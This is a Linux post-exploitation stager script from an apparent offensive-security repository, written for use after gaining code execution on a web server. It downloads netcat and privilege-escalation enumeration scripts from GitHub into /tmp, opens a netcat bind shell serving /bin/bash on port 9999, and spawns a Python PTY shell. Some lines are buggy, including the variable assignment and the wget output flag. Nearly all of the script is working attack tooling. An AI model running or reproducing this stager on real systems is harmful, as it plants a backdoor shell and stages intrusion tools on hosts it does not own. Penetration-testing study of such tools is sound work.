# used to stage all appropriate tools needed for privesc + handles some base config setup
# use: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh && chmod +x linux_stager.sh && ./linux_stager.sh 
# (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)


$stage = /tmp

# banner
echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
echo "[]_________________________________________________________________________________________[]"

# download NC
echo "[*] Downloading NC to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
chmod +x $stage/nc

# download linenum.sh
echo "[*] Downloading linenum.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
chmod +x $stage/linenum.sh

# download LinxPrivChecker.py
echo "[*] Downloading LinuxPrivChecker.sh to: $stage + making executable"
wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py

# build a NC bind shell incase we lose a shell
echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
$stage/nc -nlvp 9999 -e /bin/bash &

# semi interactive shell
echo "[*] Attempting to build semi-interactive shell "
if command -v python &>/dev/null; then
    echo "-[*] Python availble, dropping semi-tty shell"
    python -c 'import pty;pty.spawn("/bin/bash");'
    
elif command -v python3 &>/dev/null; then
    echo "-[*] Python 3 availble, dropping semi-tty shell"
    python3 -c 'import pty;pty.spawn("/bin/bash");' 
    
else
    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method (may or may not work)"
    #echo os.system('/bin/bash')
fi
echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"



